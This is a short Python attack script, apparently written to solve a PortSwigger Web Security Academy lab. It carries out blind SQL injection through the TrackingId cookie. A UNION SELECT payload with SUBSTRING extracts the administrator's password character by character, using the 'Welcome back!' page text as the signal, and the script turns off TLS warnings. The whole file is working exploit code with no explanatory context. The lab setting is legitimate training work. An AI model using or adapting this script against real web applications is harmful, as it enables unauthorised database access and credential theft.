# burp web sec academy script
import sys
import requests
import string
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = sys.argv[1]
chars = list(string.ascii_lowercase+string.digits)
password = ""
result= ""

x = range(1,7)
for i in x:
    for c in chars:
        cookies = {'TrackingId':'xyz\' UNION SELECT \'a\' FROM users WHERE Username = \'administrator\' and SUBSTRING(Password, %s, 1) = \'%s\'--'% (i,password+c)}
        resp = requests.get(url, cookies=cookies).text
        if "Welcome back!" in resp:
            result+=c
            sys.stdout.write("\r"+"Password: " + result)
            sys.stdout.flush()
            break
        elif c == chars[-1]:
            exit(0)
